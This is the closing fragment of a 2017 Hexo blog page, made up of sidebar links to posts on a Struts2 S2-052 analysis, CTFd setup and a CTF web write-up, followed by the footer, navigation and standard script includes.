          </li>
        
          <li>
            <a href="/2017/09/07/struts2-S2-052-复现及分析/">struts2 S2-052 复现及分析</a>
          </li>
        
          <li>
            <a href="/2017/07/16/CTFd-Flask-使用flask-migrate迁移数据库/">CTFd--Flask--使用flask-migrate迁移数据库</a>
          </li>
        
          <li>
            <a href="/2017/07/16/CTFd-发邮件的坑/">CTFd--发邮件的坑</a>
          </li>
        
          <li>
            <a href="/2017/07/12/第十届全国大学生信息安全竞赛-部分web-writeup/">第十届全国大学生信息安全竞赛 部分web-writeup</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2017 Headwind<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>



  </div>
</body>
</html>